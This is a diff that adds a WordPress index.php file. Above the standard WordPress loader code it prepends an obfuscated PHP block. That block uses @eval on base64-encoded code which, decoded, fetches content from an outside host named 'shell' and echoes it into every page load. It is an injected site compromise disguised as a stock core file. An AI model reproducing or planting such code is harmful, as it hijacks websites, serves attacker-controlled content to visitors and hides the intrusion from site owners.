@@ -1,0 +1,21 @@
+<?php
+$c3RyX = "A8m9s1";
+@eval(base64_decode("ZWNobyBmaWxlX2dldF9jb250ZW50cygiaHR0cDovL3NoZWxsLm5ueHV1LmNvbS9pbmRleC5waHA/cj1saW5rcyZ2PSRjM1J5WCIp").";");
+?>
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define('WP_USE_THEMES', true);
+
+/** Loads the WordPress Environment and Template */
+require( dirname( __FILE__ ) . '/wp-blog-header.php' );
